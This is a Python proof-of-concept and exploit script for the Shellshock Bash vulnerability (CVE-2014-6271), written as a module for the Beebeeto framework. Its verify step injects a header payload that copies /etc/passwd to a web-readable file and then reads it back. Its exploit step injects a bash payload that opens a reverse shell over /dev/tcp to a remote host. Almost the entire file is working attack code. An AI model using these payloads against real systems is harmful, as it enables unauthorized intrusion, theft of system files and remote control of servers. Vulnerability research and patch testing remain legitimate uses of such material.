#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""


import urllib2
import httplib

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0027',
            'name': 'Bash 3.0-4.3 Command Execution(CVE-2014-6271) POC & Exploit',
            'author': 'win95',
            'create_date': '2014-09-25',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'bash',  # 漏洞所涉及的应用名称
            'vul_version': ['<4.3'],  # 受漏洞影响的应用版本
            'type': 'Command Execution',  # 漏洞类型
            'tag': ['bash', 'cgi', 'code injection'],  # 漏洞相关tag
            'desc': 'Bash Environment Variables Code Injection Exploit',  # 漏洞描述
            'references': ['https://www.invisiblethreat.ca/2014/09/cve-2014-6271/',
                            'http://seclists.org/oss-sec/2014/q3/649',  # 参考链接
            ],
        },
    }


    def _init_user_parser(self):  # 定制命令行参数
        self.user_parser.add_option('-p','--cgi',
                                    action='store', dest='cgi_path', type='string', default=None,
                                    help='Vul CGI path')
        self.user_parser.add_option('-r','--remote',
                                    action='store', dest='remote_host', type='string', default=None,
                                    help='Reverse a shell to your host')


    @classmethod
    def verify(cls, args):
        payload = "() { :; }; /bin/cat /etc/passwd > dumped_file"
        target = args['options']['target'].replace('http://', '')
        attack_url = args['options']['target'] + '/' + str(args['options']['cgi_path'])
        check_url = 'http://'+"/".join(attack_url.split('/')[2:-1])
        if args['options']['verbose']:
            print '[*] Request URL: ' + attack_url
            print '[*] Post Data: ' + payload
        conn = httplib.HTTPConnection(target)
        headers = {"Content-type": "application/x-www-form-urlencoded",
        "test":payload }
        conn.request("GET",args['options']['cgi_path'],headers=headers)
        res = conn.getresponse()
        content = urllib2.urlopen(check_url+'/dumped_file').read()
        if 'root' in content:
            args['success'] = True
            if args['options']['verbose']:
                print '[*] Success URL: ' + attack_url
            return args
        else:
            args['success'] = False
            return args


    @classmethod
    def exploit(cls, args):
        payload = "() { ignored;};/bin/bash -i >& /dev/tcp/%s 0>&1" % args['options']['remote_host']
        target = args['options']['target'].replace('http://', '')
        attack_url = args['options']['target'] + '/' + str(args['options']['cgi_path'])
        if args['options']['verbose']:
            print '[*] Please run as verify mode to check if vul exist, if exist ,then run as exploit mode to get your reverse shell'
            print '[*] Request URL: ' + attack_url
            print '[*] Post Data: ' + payload
        conn = httplib.HTTPConnection(target)
        headers = {"Content-type": "application/x-www-form-urlencoded",
        "test":payload }
        conn.request("GET",args['options']['cgi_path'], headers=headers)
        res = conn.getresponse()
        if args['options']['verbose']:
            print res.status, res.reason
            data = res.read()
            print data
        args['success'] = True
        args['poc_ret']['content'] = 'Reverse Shell was send , Look at your host.'
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())